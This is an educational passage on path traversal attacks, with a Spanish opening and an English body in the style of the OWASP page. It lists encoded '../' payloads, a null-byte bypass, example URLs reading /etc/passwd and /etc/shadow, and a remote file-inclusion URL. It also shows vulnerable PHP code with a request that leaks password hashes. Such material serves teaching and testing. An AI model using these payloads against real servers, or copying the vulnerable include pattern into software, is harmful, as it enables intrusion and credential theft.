
Los path traversal se pueden detectar cuando podemos movernos entre los directorios del sistema usando "../../../", la forma de probarlo es principalmente buscar campos en los que podamos acceder a archivos, usualmente esto se encuentra en parametros que nos permitan descargar archivos, o incluso en la propia web, estas dos formas se verian algo así

## Related Security Activities
## Description

### Request variations

Encoding and double encoding:

- `%2e%2e%2f`  -> represents ->  `../`
- `%2e%2e/` ->  represents ->  `../`
- `..%2f` -> represents ->  `../`
- `%2e%2e%5c` ->  represents -> `..\`
- `%2e%2e\` -> represents -> `..\`
- `..%5c` ->  represents  -> `..\`
- `%252e%252e%255c` -> represents  -> `..\`
- `..%255c` ->  represents ->  `..\`

and so on.

#### Percent encoding (aka URL encoding)

Note that web containers perform one level of decoding on percent encoded values from forms and URLs.

- `..%c0%af` represents `../`
- `..%c1%9c` represents `..\`

#### OS specific

UNIX

```ruby
Root directory:  “ / “ 
Directory separator: “ / “
```

WINDOWS

``` ruby
Root directory: “  <partition letter> : \ “
Directory separator: “ / “ or “ \ ” 
Note that windows allows filenames to be followed by extra . \ / characters.
```

In many operating systems, null bytes `%00` can be injected to terminate the filename. For example, sending a parameter like:

`?file=secret.doc%00.pdf`

will result in the Java application seeing a string that ends with “.pdf” and the operating system will see a file that ends in “.doc”. Attackers may use this trick to bypass validation routines.

## Examples

### Example 1

The following examples show how the application deals with the resources in use.

```ruby
http://some_site.com.br/get-files.jsp?file=report.pdf
http://some_site.com.br/get-page.php?home=aaa.html 
http://some_site.com.br/some-page.asp?page=index.html
```

In these examples it’s possible to insert a malicious string as the variable parameter to access files located outside the web publish directory.

```ruby
http://some_site.com.br/get-files?file=../../../../some dir/some file
http://some_site.com.br/../../../../some dir/some file
```

The following URLs show examples of *NIX password file exploitation.

```ruby
http://some_site.com.br/../../../../etc/shadow
http://some_site.com.br/get-files?file=/etc/passwd
```

Note: In a Windows system an attacker can navigate only in a partition that locates web root while in the Linux they can navigate in the whole disk.

### Example 2

It’s also possible to include files and scripts located on external website.

`http://some_site.com.br/some-page?page=http://other-site.com.br/other-page.htm/malicius-code.php`

### Example 3

These examples illustrate a case when an attacker made the server show the CGI source code.

`http://vulnerable-page.org/cgi-bin/main.cgi?file=main.cgi`

### Example 4

This example was extracted from: [Wikipedia - Directory Traversal](https://en.wikipedia.org/wiki/Directory_traversal_attack#Example)

A typical example of vulnerable application code is:

```php
<?php
$template = 'blue.php';
if ( is_set( $_COOKIE['TEMPLATE'] ) )
   $template = $_COOKIE['TEMPLATE'];
include ( "/home/users/phpguru/templates/" . $template );
?>
```

An attack against this system could be to send the following HTTP request:

```http
GET /vulnerable.php HTTP/1.0
Cookie: TEMPLATE=../../../../../../../../../etc/passwd
```

Generating a server response such as:

```http
HTTP/1.0 200 OK
Content-Type: text/html
Server: Apache

root:fi3sED95ibqR6:0:1:System Operator:/:/bin/ksh
daemon:*:1:1::/tmp:
phpguru:f8fk3j1OIf31.:182:100:Developer:/home/users/phpguru/:/bin/csh
```

The repeated `../` characters after `/home/users/phpguru/templates/` has caused [include()](http://www.php.net/manual/en/function.include.php) to traverse to the root directory, and then include the UNIX password file `/etc/passwd`.

UNIX `etc/passwd` is a common file used to demonstrate **directory traversal**, as it is often used by crackers to try cracking the passwords.

### Absolute Path Traversal

The following URLs may be vulnerable to this attack:

```ruby
http://testsite.com/get.php?f=list
http://testsite.com/get.cgi?f=2
http://testsite.com/get.asp?f=test
```

An attacker can execute this attack like this:

```ruby
http://testsite.com/get.php?f=/var/www/html/get.php
http://testsite.com/get.cgi?f=/var/www/html/admin/get.inc
http://testsite.com/get.asp?f=/etc/passwd
```

When the web server returns information about errors in a web application, it is much easier for the attacker to guess the correct locations (e.g. path to the file with a source code, which then may be displayed).